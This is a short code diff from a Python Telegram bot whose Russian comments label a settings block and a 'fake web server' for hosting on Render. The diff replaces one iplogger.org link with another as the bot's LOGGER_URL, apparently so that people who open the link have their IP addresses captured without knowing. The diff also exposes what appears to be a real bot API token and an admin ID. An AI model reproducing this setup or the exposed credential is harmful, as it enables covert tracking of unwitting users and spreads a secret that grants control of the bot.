@@ -9,7 +9,7 @@ from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMar
 # --- НАСТРОЙКИ ---
 API_TOKEN = '8531763156:AAGkTIJDVaTuKT6zIK0QYira73S8B-0qlXc'
 ADMIN_ID = 5476069446
-LOGGER_URL = "https://iplogger.org/2u7vG5" # Твоя ссылка
+LOGGER_URL = "https://iplogger.org/ua/logger/JL3R5zePB1h2/" # Твоя ссылка
 
 # --- ФЕЙКОВЫЙ ВЕБ-СЕРВЕР (Для Render) ---
 app = Flask(__name__)
